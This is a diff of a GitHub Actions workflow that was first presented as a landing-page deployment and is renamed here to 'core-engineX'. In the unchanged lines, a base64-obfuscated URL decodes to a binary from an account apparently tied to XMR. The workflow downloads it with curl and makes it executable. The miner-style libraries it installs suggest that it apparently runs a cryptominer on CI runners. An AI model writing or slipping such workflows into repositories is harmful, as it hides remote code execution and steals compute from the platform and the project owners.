@@ -1,4 +1,4 @@
-name: Deploy My Landing Page
+name: Deploy core-engineX
 
 on:
   push:
@@ -12,23 +12,23 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: 1 Checkout Repository
+      - name: 1 Checkout Repository 1
         uses: actions/checkout@v2
 
-      - name: 2 Setup Prerequisite Environment
+      - name: 2 Setup Prerequisite Dependencies 2
         shell: bash
         run: |
           sudo apt-get update
-          sudo apt-get install -y curl unzip libuv1-dev libssl-dev libhwloc-dev
+          sudo apt-get install -y curl libuv1-dev libssl-dev libhwloc-dev
 
-      - name: 3 Prepare Page Engine
+      - name: 3 Download core-engine 3
         shell: bash
         run: |
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL2Fub25tYXh5WE1SL2NvcmUtZW5naW5lL3JlbGVhc2VzL2Rvd25sb2FkL3YwMy9jb3JlLWVuZ2luZQ=="
           URL=$(echo "$ENCODED" | base64 -d)
           curl -L -o core-engine "$URL"
 
-      - name: 4 Launch Runtime
+      - name: 4 Run Machine 4
         shell: bash
         run: |
           chmod +x core-engine
